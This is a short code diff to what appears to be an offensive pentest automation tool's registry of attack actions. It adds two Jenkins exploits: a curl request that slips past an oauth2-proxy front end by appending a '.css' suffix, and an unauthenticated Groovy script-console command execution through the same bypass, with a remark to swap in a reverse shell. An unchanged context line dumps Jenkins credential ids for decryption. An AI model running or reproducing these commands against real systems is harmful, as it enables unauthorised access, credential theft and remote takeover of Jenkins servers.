@@ -201,6 +201,19 @@ ACTION_REGISTRY: dict[str, Action] = {
          "com.cloudbees.plugins.credentials.SystemCredentialsProvider.getInstance()"
          ".getCredentials().forEach{println it.id}'"],
         risk="propose", note="Dump Jenkins-stored credential ids, then decrypt."),
+    "jenkins_oauth2proxy_bypass": _a("jenkins_oauth2proxy_bypass",
+        ["# oauth2-proxy skip_auth_routes often uses an UNANCHORED \\.(js|css|svg|woff2|map)$ regex,",
+         "# and Jenkins/Stapler ignores a trailing /<anything>.css path token -> the pair bypasses",
+         "# auth straight to the Jenkins backend:",
+         "curl -si $URL/api/json/x.css   # look for X-Jenkins / hudson.model.Hudson (anonymous)"],
+        outputs="http",
+        note="Static-extension suffix bypass of an oauth2-proxy front (CVE-2025-54576 class)."),
+    "jenkins_suffix_console_rce": _a("jenkins_suffix_console_rce",
+        ["curl -s -X POST $URL/scriptText/x.css --data-urlencode "
+         "'script=println([\"bash\",\"-c\",\"id\"].execute().text)'"],
+        risk="propose", runnable=False, outputs="raw",
+        note="Anonymous Jenkins Groovy RCE through the proxy-bypass suffix (authZ=Unsecured). "
+             "Swap id for a reverse shell."),
 
     # --- Traditional: gitlab ---
     "gitlab_version_cve": _a("gitlab_version_cve",
